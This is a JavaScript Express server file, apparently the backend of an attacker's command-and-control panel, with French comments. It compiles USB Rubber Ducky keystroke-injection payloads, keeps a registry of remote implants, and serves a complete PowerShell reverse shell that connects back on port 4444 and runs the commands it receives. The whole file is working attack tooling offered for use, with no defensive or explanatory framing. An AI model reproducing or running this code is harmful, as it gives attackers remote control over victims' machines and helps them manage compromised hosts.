// server/api.js
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());
app.use('/static', express.static('payloads'));

// Compilation Rubber Ducky
app.post('/compile', (req, res) => {
    const { name, payload } = req.body;
    const duckyCode = payload;
    const encoder = require('ducky-encoder');
    
    try {
        const encoded = encoder.encode(duckyCode);
        const binPath = `./payloads/${name}.bin`;
        fs.writeFileSync(binPath, Buffer.from(encoded, 'hex'));
        res.json({ success: true, path: binPath });
    } catch (e) {
        res.json({ error: e.message });
    }
});

// Gestion implants distants
app.post('/implant/register', (req, res) => {
    const { id, ip, status } = req.body;
    const implants = JSON.parse(fs.readFileSync('implants.json', 'utf8'));
    implants[id] = { ip, status, last_seen: Date.now() };
    fs.writeFileSync('implants.json', JSON.stringify(implants));
    res.json({ success: true });
});

// Shell distant
app.post('/shell/:id/execute', (req, res) => {
    const { command } = req.body;
    // Implémente PowerShell reverse shell
    const ps1 = `
    $client = New-Object System.Net.Sockets.TCPClient('${req.ip}', 4444);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }
    $client.Close();
    `;
    
    res.json({ payload: ps1 });
});

app.listen(3001, () => console.log('API: http://localhost:3001'));